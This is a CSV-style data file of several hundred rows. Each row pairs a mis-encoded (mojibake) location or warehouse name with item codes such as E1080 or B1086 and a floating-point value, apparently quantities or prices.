' ½­Òõ¿â´æ,E1080,"",2.81099999999999994316
' ½­Òõ¿â´æ,E1081,"",1.08200000000000007283
' ½­Òõ¿â´æ,E1082,"",4.10899999999999998579
' ½­Òõ¿â´æ,E1083,"",4.81799999999999961631
' ½­Òõ¿â´æ,E1084,"",2.10800000000000009592
' ½­Òõ¿â´æ,E1085,"",0.63900000000000001243
' ½­Òõ¿â´æ,B1086,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1087,"",1.11200000000000009948
' ½­Òõ¿â´æ,E1088,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1090,"",0.42299999999999998712
' ½­Òõ¿â´æ,E1093,"",3.10899999999999998579
' ½­Òõ¿â´æ,E1095,"",7.69399999999999995026
' ½­Òõ¿â´æ,E1096,"",1.38199999999999989519
' ½­Òõ¿â´æ,E1097,"",4.51299999999999990052
' ½­Òõ¿â´æ,E1098,"",4.17900000000000027001
' ½­Òõ¿â´æ,E1099,"",0.82399999999999995470
' ½­Òõ¿â´æ,E1100,"",1.03600000000000003197
' ½­Òõ¿â´æ,E1101,"",5.87800000000000011369
' ½­Òõ¿â´æ,E1102,"",0.82399999999999995470
' ½­Òõ¿â´æ,E1103,"",2.20800000000000018474
' ½­Òõ¿â´æ,E1104,"",0.40699999999999997291
' ½­Òõ¿â´æ,B1105,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1105,"",1.52400000000000002132
' ½­Òõ¿â´æ,E1106,"",3.69799999999999995381
' ½­Òõ¿â´æ,E1107,"",1.08200000000000007283
' ½­Òõ¿â´æ,E1108,"",4.10899999999999998579
' ½­Òõ¿â´æ,B1110,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1110,"",0.98599999999999998757
' ½­Òõ¿â´æ,B1111,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1111,"",1.82099999999999995204
' ½­Òõ¿â´æ,E1112,"",4.30999999999999960920
' ½­Òõ¿â´æ,E1113,"",2.22199999999999997513
' ½­Òõ¿â´æ,E1114,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1115,"",1.25699999999999989519
' ½­Òõ¿â´æ,E1116,"",0.89400000000000001688
' ½­Òõ¿â´æ,E1117,"",0.83099999999999996092
' ½­Òõ¿â´æ,B1118,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1119,"",2.99699999999999988631
' ½­Òõ¿â´æ,E1120,"",2.34699999999999997513
' ½­Òõ¿â´æ,B1121,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1121,"",1.06899999999999995026
' ½­Òõ¿â´æ,E1122,"",0.89700000000000001954
' ½­Òõ¿â´æ,B1123,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1123,"",1.82099999999999995204
' ½­Òõ¿â´æ,B1124,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1124,"",1.55800000000000005151
' ½­Òõ¿â´æ,E1125,"",6.00399999999999955946
' ½­Òõ¿â´æ,E1128,"",4.03899999999999970157
' ½­Òõ¿â´æ,E1129,"",5.41899999999999959499
' ½­Òõ¿â´æ,E1130,"",3.45900000000000007461
' ½­Òõ¿â´æ,E1132,"",1.75699999999999989519
' ½­Òõ¿â´æ,E1133,"",0.98399999999999998579
' ½­Òõ¿â´æ,E1134,"",5.97900000000000009237
' ½­Òõ¿â´æ,E1135,"",5.60700000000000020606
' ½­Òõ¿â´æ,E1136,"",1.30800000000000005151
' ½­Òõ¿â´æ,E1137,"",5.43299999999999982947
' ½­Òõ¿â´æ,E1138,"",0.68400000000000005240
' ½­Òõ¿â´æ,E1141,"",3.11699999999999999289
' ½­Òõ¿â´æ,E1142,"",0.55400000000000004796
' ½­Òõ¿â´æ,E1143,"",2.29999999999999982236
' ½­Òõ¿â´æ,E1144,"",4.38699999999999956657
' ½­Òõ¿â´æ,E1145,"",0.98699999999999998845
' ½­Òõ¿â´æ,E1146,"",7.00699999999999967315
' ½­Òõ¿â´æ,E1149,"",3.81199999999999983302
' ½­Òõ¿â´æ,E1150,"",4.05900000000000016342
' ½­Òõ¿â´æ,E1151,"",1.25200000000000000178
' ½­Òõ¿â´æ,E1152,"",2.65600000000000013856
' ½­Òõ¿â´æ,E1153,"",6.92699999999999960210
' ½­Òõ¿â´æ,E1154,"",2.91900000000000003908
' ½­Òõ¿â´æ,E1156,"",1.60600000000000009415
' ½­Òõ¿â´æ,E1157,"",3.60300000000000020250
' ½­Òõ¿â´æ,E1158,"",1.60600000000000009415
' ½­Òõ¿â´æ,E1159,"",5.43299999999999982947
' ½­Òõ¿â´æ,E1160,"",5.91899999999999959499
' ½­Òõ¿â´æ,B1161,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1161,"",1.82099999999999995204
' ½­Òõ¿â´æ,E1162,"",2.07500000000000017764
' ½­Òõ¿â´æ,E1163,"",4.18299999999999982947
' ½­Òõ¿â´æ,B1164,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1164,"",1.47900000000000009237
' ½­Òõ¿â´æ,E1165,"",1.60099999999999997868
' ½­Òõ¿â´æ,E1166,"",8.20299999999999940314
' ½­Òõ¿â´æ,E1167,"",3.32600000000000006750
' ½­Òõ¿â´æ,E1168,"",2.91900000000000003908
' ½­Òõ¿â´æ,E1169,"",2.91900000000000003908
' ½­Òõ¿â´æ,E1170,"",2.91900000000000003908
' ½­Òõ¿â´æ,E1171,"",5.46400000000000041211
' ½­Òõ¿â´æ,E1172,"",3.65300000000000002487
' ½­Òõ¿â´æ,E1173,"",2.91900000000000003908
' ½­Òõ¿â´æ,E1174,"",2.88700000000000001066
' ½­Òõ¿â´æ,E1175,"",3.00899999999999989697
' ½­Òõ¿â´æ,E1176,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1177,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1178,"",4.82800000000000029132
' ½­Òõ¿â´æ,E1179,"",2.50400000000000000355
' ½­Òõ¿â´æ,E1180,"",3.02099999999999990763
' ½­Òõ¿â´æ,E1181,"",8.89600000000000079581
' ½­Òõ¿â´æ,E1182,"",9.02999999999999936051
' ½­Òõ¿â´æ,E1183,"",5.43200000000000038369
' ½­Òõ¿â´æ,E1186,"",0.91200000000000003286
' ½­Òõ¿â´æ,E1188,"",4.95800000000000018474
' ½­Òõ¿â´æ,E1189,"",2.62400000000000011013
' ½­Òõ¿â´æ,E1191,"",2.90099999999999980105
' ½­Òõ¿â´æ,E1192,"",8.06600000000000072475
' ½­Òõ¿â´æ,E1193,"",4.13999999999999968026
' ½­Òõ¿â´æ,E1195,"",5.04399999999999959499
' ½­Òõ¿â´æ,E1196,"",7.26900000000000012790
' ½­Òõ¿â´æ,E1197,"",2.94200000000000017053
' ½­Òõ¿â´æ,E1198,"",8.34500000000000063949
' ½­Òõ¿â´æ,E1199,"",4.21900000000000030553
' ½­Òõ¿â´æ,E1200,"",4.04199999999999981526
' ½­Òõ¿â´æ,E1201,"",4.93599999999999994316
' ½­Òõ¿â´æ,E1202,"",5.04399999999999959499
' ½­Òõ¿â´æ,E1204,"",2.82600000000000006750
' ½­Òõ¿â´æ,B1205,"",18.39999999999999857891
' ½­Òõ¿â´æ,E1206,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1207,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1208,"",5.17199999999999970868
' ½­Òõ¿â´æ,E1209,"",1.96100000000000007638
' ½­Òõ¿â´æ,E1210,"",1.10099999999999997868
' ½­Òõ¿â´æ,E1211,"",7.55299999999999993605
' ½­Òõ¿â´æ,E1212,"",2.19099999999999983658
' ½­Òõ¿â´æ,E1213,"",0.98099999999999998312
' ½­Òõ¿â´æ,E1214,"",2.32299999999999995381
' ½­Òõ¿â´æ,E1215,"",2.20800000000000018474
' ½­Òõ¿â´æ,E1216,"",1.07200000000000006395
' ½­Òõ¿â´æ,E1217,"",5.33900000000000041211
' ½­Òõ¿â´æ,E1218,"",8.40700000000000002842
' ½­Òõ¿â´æ,E1219,"",2.96300000000000007816
' ½­Òõ¿â´æ,E1220,"",10.34900000000000019895
' ½­Òõ¿â´æ,E1221,"",4.14299999999999979394
' ½­Òõ¿â´æ,E1222,"",3.08099999999999996092
' ½­Òõ¿â´æ,E1223,"",1.06099999999999994316
' ½­Òõ¿â´æ,E1225,"",6.79699999999999970868
' ½­Òõ¿â´æ,E1226,"",2.10300000000000020250
' ½­Òõ¿â´æ,E1228,"",1.09899999999999997691
' ½­Òõ¿â´æ,E1229,"",0.79100000000000003642
' ½­Òõ¿â´æ,E1230,"",3.43400000000000016342
' ½­Òõ¿â´æ,E1231,"",1.35600000000000009415
' ½­Òõ¿â´æ,E1232,"",6.66399999999999970157
' ½­Òõ¿â´æ,E1235,"",2.96300000000000007816
' ½­Òõ¿â´æ,E1236,"",2.89100000000000001421
' ½­Òõ¿â´æ,E1237,"",3.16800000000000014921
' ½­Òõ¿â´æ,E1238,"",1.91199999999999992184
' ½­Òõ¿â´æ,E1240,"",0.46899999999999997247
' ½­Òõ¿â´æ,E1243,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1244,"",0.82899999999999995914
' ½­Òõ¿â´æ,E1246,"",2.18000000000000015987
' ½­Òõ¿â´æ,E1247,"",2.93900000000000005684
' ½­Òõ¿â´æ,E1248,"",2.30100000000000015632
' ½­Òõ¿â´æ,E1249,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1250,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1251,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1252,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1253,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1254,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1255,"",1.86400000000000010125
' ½­Òõ¿â´æ,E1256,"",2.07200000000000006395
' ½­Òõ¿â´æ,E1258,"",2.55900000000000016342
' ½­Òõ¿â´æ,E1259,"",2.91599999999999992539
' ½­Òõ¿â´æ,E1262,"",2.96300000000000007816
' ½­Òõ¿â´æ,E1263,"",2.96300000000000007816
' ½­Òõ¿â´æ,E1264,"",2.75400000000000000355
' ½­Òõ¿â´æ,E1265,"",4.02899999999999991473
' ½­Òõ¿â´æ,E1266,"",2.73799999999999998934
' ½­Òõ¿â´æ,E1267,"",1.25600000000000000533
' ½­Òõ¿â´æ,E1268,"",0.59599999999999997424
' ½­Òõ¿â´æ,E1269,"",0.85199999999999997957
' ½­Òõ¿â´æ,E1270,"",2.19399999999999995026
' ½­Òõ¿â´æ,E1271,"",5.76299999999999990052
' ½­Òõ¿â´æ,E1272,"",2.73899999999999987921
' ½­Òõ¿â´æ,E1273,"",0.85099999999999997868
' ½­Òõ¿â´æ,E1274,"",1.92300000000000004263
' ½­Òõ¿â´æ,E1275,"",5.83300000000000018474
' ½­Òõ¿â´æ,E1276,"",2.43400000000000016342
' ½­Òõ¿â´æ,E1279,"",0.60399999999999998135
' ½­Òõ¿â´æ,E1280,"",3.06199999999999983302
' ½­Òõ¿â´æ,E1281,"",2.55900000000000016342
' ½­Òõ¿â´æ,E1282,"",0.82399999999999995470
' ½­Òõ¿â´æ,E1284,"",1.26499999999999990230
' ½­Òõ¿â´æ,E1287,"",0.84099999999999996980
' ½­Òõ¿â´æ,E1288,"",3.64900000000000002132
' ½­Òõ¿â´æ,E1289,"",0.99599999999999999645
' ½­Òõ¿â´æ,E1290,"",1.50699999999999989519
' ½­Òõ¿â´æ,E1291,"",2.48399999999999998579
' ½­Òõ¿â´æ,E1293,"",0.86799999999999999378
' ½­Òõ¿â´æ,E1294,"",3.62699999999999977973
' ½­Òõ¿â´æ,E1295,"",0.77800000000000002487
' ½­Òõ¿â´æ,E1296,"",3.94300000000000006040
' ½­Òõ¿â´æ,E1297,"",2.55600000000000004974
' ½­Òõ¿â´æ,E1298,"",2.08599999999999985434
' ½­Òõ¿â´æ,E1299,"",3.43400000000000016342
' ½­Òõ¿â´æ,E1301,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1302,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1303,"",1.78699999999999992184
' ½­Òõ¿â´æ,E1305,"",0.65400000000000002576
' ½­Òõ¿â´æ,E1306,"",0.89800000000000002043
' ½­Òõ¿â´æ,E1307,"",4.75100000000000033396
' ½­Òõ¿â´æ,E1308,"",3.33800000000000007816
' ½­Òõ¿â´æ,E1309,"",0.72699999999999997957
' ½­Òõ¿â´æ,E1310,"",0.83899999999999996803
' ½­Òõ¿â´æ,E1311,"",3.50700000000000011724
' ½­Òõ¿â´æ,E1312,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1313,"",2.65700000000000002842
' ½­Òõ¿â´æ,E1315,"",2.05200000000000004619
' ½­Òõ¿â´æ,E1318,"",7.18900000000000005684
' ½­Òõ¿â´æ,E1319,"",2.29099999999999992539
' ½­Òõ¿â´æ,E1320,"",4.20699999999999985079
' ½­Òõ¿â´æ,E1326,"",3.43400000000000016342
' ½­Òõ¿â´æ,E1327,"",3.80299999999999993605
' ½­Òõ¿â´æ,E1328,"",0.99699999999999999734
' ½­Òõ¿â´æ,E1329,"",6.47599999999999997868
' ½­Òõ¿â´æ,E1330,"",1.83899999999999996803
' ½­Òõ¿â´æ,E1331,"",4.02099999999999990763
' ½­Òõ¿â´æ,E1332,"",1.01099999999999989875
' ½­Òõ¿â´æ,E1333,"",3.41699999999999981526
' ½­Òõ¿â´æ,E1334,"",1.01499999999999990230
' ½­Òõ¿â´æ,E1335,"",1.05899999999999994138
' ½­Òõ¿â´æ,E1336,"",5.97900000000000009237
' ½­Òõ¿â´æ,E1337,"",5.51100000000000012079
' ½­Òõ¿â´æ,E1338,"",7.60200000000000031264
' ½­Òõ¿â´æ,E1339,"",0.83899999999999996803
' ½­Òõ¿â´æ,E1340,"",4.56899999999999995026
' ½­Òõ¿â´æ,E1341,"",0.82399999999999995470
' ½­Òõ¿â´æ,E1342,"",0.82399999999999995470
' ½­Òõ¿â´æ,E1343,"",0.77200000000000001954
' ½­Òõ¿â´æ,E1344,"",1.03499999999999992006
' ½­Òõ¿â´æ,E1345,"",0.64600000000000001865
' ½­Òõ¿â´æ,E1346,"",1.70799999999999996270
' ½­Òõ¿â´æ,E1347,"",1.98199999999999998401
' ½­Òõ¿â´æ,E1348,"",3.06099999999999994316
' ½­Òõ¿â´æ,E1349,"",4.47200000000000041922
' ½­Òõ¿â´æ,E1350,"",4.39599999999999990763
' ½­Òõ¿â´æ,E1352,"",0.65400000000000002576
' ½­Òõ¿â´æ,E1353,"",0.65400000000000002576
' ½­Òõ¿â´æ,E1356,"",3.46399999999999996803
' ½­Òõ¿â´æ,E1357,"",5.51799999999999979394
' ½­Òõ¿â´æ,E1358,"",2.79700000000000015277
' ½­Òõ¿â´æ,E1359,"",4.98500000000000031974
' ½­Òõ¿â´æ,E1360,"",1.07600000000000006750
' ½­Òõ¿â´æ,E1361,"",1.01800000000000001599
' ½­Òõ¿â´æ,E1362,"",3.41199999999999992184
' ½­Òõ¿â´æ,E1363,"",0.58199999999999996181
' ½­Òõ¿â´æ,E1364,"",1.09099999999999996980
' ½­Òõ¿â´æ,E1366,"",1.09600000000000008527
' ½­Òõ¿â´æ,E1367,"",5.53899999999999970157
' ½­Òõ¿â´æ,E1368,"",1.06800000000000006040
' ½­Òõ¿â´æ,E1369,"",0.87299999999999999822
' ½­Òõ¿â´æ,E1370,"",8.17399999999999948841
' ½­Òõ¿â´æ,E1371,"",1.70900000000000007461
' ½­Òõ¿â´æ,E1374,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1375,"",1.71399999999999996803
' ½­Òõ¿â´æ,E1377,"",2.91400000000000014566
' ½­Òõ¿â´æ,E1379,"",3.29700000000000015277
' ½­Òõ¿â´æ,E1380,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1382,"",3.94700000000000006395
' ½­Òõ¿â´æ,E1383,"",1.01699999999999990408
' ½­Òõ¿â´æ,E1384,"",1.46799999999999997158
' ½­Òõ¿â´æ,E1385,"",2.74599999999999999645
' ½­Òõ¿â´æ,E1386,"",1.82400000000000006573
' ½­Òõ¿â´æ,E1387,"",2.38499999999999978684
' ½­Òõ¿â´æ,E1388,"",1.83200000000000007283
' ½­Òõ¿â´æ,E1389,"",0.75900000000000000799
' ½­Òõ¿â´æ,E1390,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1391,"",2.80200000000000004619
' ½­Òõ¿â´æ,E1393,"",2.81800000000000006040
' ½­Òõ¿â´æ,E1394,"",1.38900000000000001243
' ½­Òõ¿â´æ,E1396,"",2.49299999999999988276
' ½­Òõ¿â´æ,E1397,"",3.89699999999999979750
' ½­Òõ¿â´æ,E1398,"",1.01800000000000001599
' ½­Òõ¿â´æ,E1399,"",3.39100000000000001421
' ½­Òõ¿â´æ,E1400,"",4.80799999999999982947
' ½­Òõ¿â´æ,E1401,"",1.16300000000000003375
' ½­Òõ¿â´æ,E1402,"",0.99599999999999999645
' ½­Òõ¿â´æ,E1403,"",0.99599999999999999645
' ½­Òõ¿â´æ,E1404,"",9.34699999999999953104
' ½­Òõ¿â´æ,E1405,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1406,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1407,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1408,"",0.89300000000000001599
' ½­Òõ¿â´æ,E1409,"",2.63399999999999989697
' ½­Òõ¿â´æ,E1410,"",4.24899999999999966604
' ½­Òõ¿â´æ,E1411,"",1.03600000000000003197
' ½­Òõ¿â´æ,E1412,"",4.24899999999999966604
' ½­Òõ¿â´æ,E1413,"",0.88300000000000000711
' ½­Òõ¿â´æ,E1415,"",3.06199999999999983302
' ½­Òõ¿â´æ,E1416,"",2.98099999999999987210
' ½­Òõ¿â´æ,E1417,"",2.42399999999999993250
' ½­Òõ¿â´æ,E1418,"",1.07400000000000006573
' ½­Òõ¿â´æ,E1419,"",1.30200000000000004619
' ½­Òõ¿â´æ,E1420,"",1.51099999999999989875
' ½­Òõ¿â´æ,E1421,"",2.75800000000000000711
' ½­Òõ¿â´æ,E1422,"",1.43700000000000005507
' ½­Òõ¿â´æ,E1423,"",2.82600000000000006750
' ½­Òõ¿â´æ,E1424,"",2.46600000000000019185
' ½­Òõ¿â´æ,E1425,"",0.85199999999999997957
' ½­Òõ¿â´æ,E1426,"",1.10800000000000009592
' ½­Òõ¿â´æ,E1428,"",1.51099999999999989875
' ½­Òõ¿â´æ,E1429,"",2.74599999999999999645
' ½­Òõ¿â´æ,E1430,"",2.54400000000000003908
' ½­Òõ¿â´æ,E1431,"",0.79200000000000003730
' ½­Òõ¿â´æ,E1433,"",1.01800000000000001599
' ½­Òõ¿â´æ,E1434,"",0.91600000000000003642
' ½­Òõ¿â´æ,E1435,"",2.51799999999999979394
' ½­Òõ¿â´æ,E1436,"",1.25600000000000000533
' ½­Òõ¿â´æ,E1437,"",0.90900000000000003020
' ½­Òõ¿â´æ,E1439,"",0.69899999999999995470
' ½­Òõ¿â´æ,E1440,"",3.96300000000000007816
' ½­Òõ¿â´æ,E1442,"",2.22800000000000020250
' ½­Òõ¿â´æ,E1443,"",0.92300000000000004263
' ½­Òõ¿â´æ,E1444,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1446,"",1.21799999999999997158
' ½­Òõ¿â´æ,E1447,"",0.85399999999999998135
' ½­Òõ¿â´æ,E1448,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1449,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1450,"",7.02799999999999958078
' ½­Òõ¿â´æ,E1451,"",3.61900000000000021672
' ½­Òõ¿â´æ,E1452,"",3.41699999999999981526
' ½­Òõ¿â´æ,E1453,"",3.36900000000000021672
' ½­Òõ¿â´æ,E1454,"",1.56800000000000006040
' ½­Òõ¿â´æ,E1455,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1456,"",14.16200000000000081002
' ½­Òõ¿â´æ,E1457,"",7.77200000000000024158
' ½­Òõ¿â´æ,E1458,"",0.99599999999999999645
' ½­Òõ¿â´æ,E1459,"",2.44899999999999984368
' ½­Òõ¿â´æ,E1463,"",1.16300000000000003375
' ½­Òõ¿â´æ,E1464,"",4.12100000000000044054
' ½­Òõ¿â´æ,E1465,"",1.16300000000000003375
' ½­Òõ¿â´æ,E1466,"",4.99600000000000044054
' ½­Òõ¿â´æ,E1467,"",4.14799999999999968736
' ½­Òõ¿â´æ,E1468,"",3.39100000000000001421
' ½­Òõ¿â´æ,E1469,"",4.26700000000000034817
' ½­Òõ¿â´æ,E1470,"",8.37400000000000055422
' ½­Òõ¿â´æ,E1471,"",2.65200000000000013500
' ½­Òõ¿â´æ,E1472,"",1.70900000000000007461
' ½­Òõ¿â´æ,E1473,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1474,"",1.15700000000000002842
' ½­Òõ¿â´æ,E1475,"",3.91800000000000014921
' ½­Òõ¿â´æ,E1476,"",3.03299999999999991829
' ½­Òõ¿â´æ,E1477,"",1.16300000000000003375
' ½­Òõ¿â´æ,B1478,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1478,"",1.24100000000000010303
' ½­Òõ¿â´æ,E1479,"",0.97399999999999997691
' ½­Òõ¿â´æ,E1481,"",0.93100000000000004974
' ½­Òõ¿â´æ,E1482,"",1.70900000000000007461
' ½­Òõ¿â´æ,E1483,"",2.46200000000000018829
' ½­Òõ¿â´æ,E1484,"",2.17099999999999981881
' ½­Òõ¿â´æ,E1485,"",2.11600000000000010303
' ½­Òõ¿â´æ,E1486,"",1.95100000000000006750
' ½­Òõ¿â´æ,E1489,"",1.87200000000000010836
' ½­Òõ¿â´æ,E1490,"",1.51099999999999989875
' ½­Òõ¿â´æ,E1492,"",2.09100000000000019185
' ½­Òõ¿â´æ,E1493,"",1.15399999999999991473
' ½­Òõ¿â´æ,E1494,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1495,"",4.10899999999999998579
' ½­Òõ¿â´æ,E1496,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1497,"",4.24099999999999965894
' ½­Òõ¿â´æ,E1498,"",1.56600000000000005862
' ½­Òõ¿â´æ,E1499,"",1.20799999999999996270
' ½­Òõ¿â´æ,E1500,"",3.50300000000000011369
' ½­Òõ¿â´æ,E1502,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1503,"",7.48800000000000043343
' ½­Òõ¿â´æ,E1505,"",6.38799999999999990052
' ½­Òõ¿â´æ,E1506,"",3.39100000000000001421
' ½­Òõ¿â´æ,E1507,"",6.44599999999999972999
' ½­Òõ¿â´æ,E1508,"",1.93300000000000005151
' ½­Òõ¿â´æ,E1509,"",3.39100000000000001421
' ½­Òõ¿â´æ,E1510,"",3.39100000000000001421
' ½­Òõ¿â´æ,E1511,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1512,"",4.84199999999999963762
' ½­Òõ¿â´æ,E1513,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1514,"",3.61399999999999987921
' ½­Òõ¿â´æ,E1515,"",1.79099999999999992539
' ½­Òõ¿â´æ,E1517,"",2.07699999999999995737
' ½­Òõ¿â´æ,E1518,"",0.58199999999999996181
' ½­Òõ¿â´æ,E1519,"",1.86099999999999998757
' ½­Òõ¿â´æ,E1520,"",3.01699999999999990408
' ½­Òõ¿â´æ,E1521,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1522,"",8.37400000000000055422
' ½­Òõ¿â´æ,E1523,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1524,"",2.38799999999999990052
' ½­Òõ¿â´æ,E1525,"",2.31800000000000006040
' ½­Òõ¿â´æ,E1527,"",0.43099999999999999423
' ½­Òõ¿â´æ,E1529,"",2.59200000000000008171
' ½­Òõ¿â´æ,E1531,"",3.61399999999999987921
' ½­Òõ¿â´æ,E1532,"",0.85199999999999997957
' ½­Òõ¿â´æ,E1533,"",0.84399999999999997247
' ½­Òõ¿â´æ,E1534,"",1.39599999999999990763
' ½­Òõ¿â´æ,E1535,"",2.24299999999999988276
' ½­Òõ¿â´æ,E1536,"",2.48399999999999998579
' ½­Òõ¿â´æ,E1537,"",1.84600000000000008527
' ½­Òõ¿â´æ,E1538,"",1.39599999999999990763
' ½­Òõ¿â´æ,E1539,"",0.70599999999999996092
' ½­Òõ¿â´æ,E1540,"",3.61399999999999987921
' ½­Òõ¿â´æ,E1541,"",1.91599999999999992539
' ½­Òõ¿â´æ,E1542,"",2.42499999999999982236
' ½­Òõ¿â´æ,E1543,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1544,"",5.99099999999999965894
' ½­Òõ¿â´æ,E1546,"",2.68699999999999983302
' ½­Òõ¿â´æ,E1547,"",1.11899999999999999467
' ½­Òõ¿â´æ,E1548,"",23.21600000000000108002
' ½­Òõ¿â´æ,E1549,"",1.95199999999999995737
' ½­Òõ¿â´æ,E1550,"",2.80200000000000004619
' ½­Òõ¿â´æ,E1551,"",0.61199999999999998845
' ½­Òõ¿â´æ,E1552,"",2.09799999999999986500
' ½­Òõ¿â´æ,E1553,"",3.05799999999999982947
' ½­Òõ¿â´æ,E1554,"",1.52200000000000001954
' ½­Òõ¿â´æ,E1555,"",2.38799999999999990052
' ½­Òõ¿â´æ,E1556,"",1.57600000000000006750
' ½­Òõ¿â´æ,E1557,"",4.02400000000000002132
' ½­Òõ¿â´æ,E1558,"",0.72099999999999997424
' ½­Òõ¿â´æ,E1559,"",3.16400000000000014566
' ½­Òõ¿â´æ,E1560,"",2.38799999999999990052
' ½­Òõ¿â´æ,E1561,"",5.82200000000000006395
' ½­Òõ¿â´æ,E1562,"",3.69300000000000006040
' ½­Òõ¿â´æ,E1563,"",2.54199999999999981526
' ½­Òõ¿â´æ,E1564,"",2.38799999999999990052
' ½­Òõ¿â´æ,E1566,"",3.80799999999999982947
' ½­Òõ¿â´æ,E1567,"",3.39100000000000001421
' ½­Òõ¿â´æ,B1568,"",18.89999999999999857891
' ½­Òõ¿â´æ,E1568,"",1.61400000000000010125
' ½­Òõ¿â´æ,E1569,"",2.01299999999999990052
' ½­Òõ¿â´æ,E1570,"",4.86200000000000009948
' ½­Òõ¿â´æ,E1571,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1572,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1573,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1574,"",4.22400000000000019895
' ½­Òõ¿â´æ,E1575,"",7.33900000000000041211
' ½­Òõ¿â´æ,E1577,"",0.87299999999999999822
' ½­Òõ¿â´æ,E1578,"",4.22400000000000019895
' ½­Òõ¿â´æ,E1579,"",4.22400000000000019895
' ½­Òõ¿â´æ,E1580,"",3.69300000000000006040
' ½­Òõ¿â´æ,E1581,"",3.08300000000000018474
' ½­Òõ¿â´æ,E1582,"",4.30799999999999982947
' ½­Òõ¿â´æ,E1583,"",6.53899999999999970157
' ½­Òõ¿â´æ,E1584,"",4.34700000000000041922
' ½­Òõ¿â´æ,E1585,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1586,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1588,"",2.29099999999999992539
' ½­Òõ¿â´æ,E1589,"",2.30200000000000004619
' ½­Òõ¿â´æ,E1590,"",2.38799999999999990052
' ½­Òõ¿â´æ,E1593,"",2.00300000000000011369
' ½­Òõ¿â´æ,E1594,"",4.54900000000000037659
' ½­Òõ¿â´æ,E1595,"",2.38799999999999990052
' ½­Òõ¿â´æ,E1596,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1597,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1599,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1600,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1601,"",4.79199999999999981526
' ½­Òõ¿â´æ,E1602,"",4.79199999999999981526
' ½­Òõ¿â´æ,E1603,"",3.63300000000000000711
' ½­Òõ¿â´æ,E1604,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1605,"",5.85099999999999997868
' ½­Òõ¿â´æ,E1606,"",2.98399999999999998579
' ½­Òõ¿â´æ,E1607,"",4.30799999999999982947
' ½­Òõ¿â´æ,E1608,"",6.67600000000000015632
' ½­Òõ¿â´æ,E1609,"",3.80799999999999982947
' ½­Òõ¿â´æ,E1610,"",1.18700000000000005507
' ½­Òõ¿â´æ,E1612,"",1.84800000000000008704
' ½­Òõ¿â´æ,E1613,"",1.71700000000000008171
' ½­Òõ¿â´æ,E1614,"",5.91899999999999959499
' ½­Òõ¿â´æ,E1615,"",2.29099999999999992539
' ½­Òõ¿â´æ,E1616,"",2.06099999999999994316
' ½­Òõ¿â´æ,E1618,"",2.17799999999999993605
' ½­Òõ¿â´æ,E1619,"",4.91600000000000036948
' ½­Òõ¿â´æ,E1621,"",0.85299999999999998046
' ½­Òõ¿â´æ,E1622,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1623,"",0.77200000000000001954
' ½­Òõ¿â´æ,E1625,"",6.67699999999999960210
' ½­Òõ¿â´æ,E1626,"",2.53900000000000014566
' ½­Òõ¿â´æ,E1627,"",3.51399999999999979039
' ½­Òõ¿â´æ,E1628,"",3.40399999999999991473
' ½­Òõ¿â´æ,E1629,"",2.41800000000000014921
' ½­Òõ¿â´æ,E1630,"",4.03300000000000036238
' ½­Òõ¿â´æ,E1631,"",0.85899999999999998579
' ½­Òõ¿â´æ,E1632,"",1.08600000000000007638
' ½­Òõ¿â´æ,E1633,"",3.76799999999999979394
' ½­Òõ¿â´æ,E1635,"",0.86399999999999999023
' ½­Òõ¿â´æ,E1636,"",0.86899999999999999467
' ½­Òõ¿â´æ,E1637,"",1.04299999999999992717
' ½­Òõ¿â´æ,E1638,"",0.67300000000000004263
' ½­Òõ¿â´æ,E1639,"",8.37400000000000055422
' ½­Òõ¿â´æ,E1640,"",1.31400000000000005684
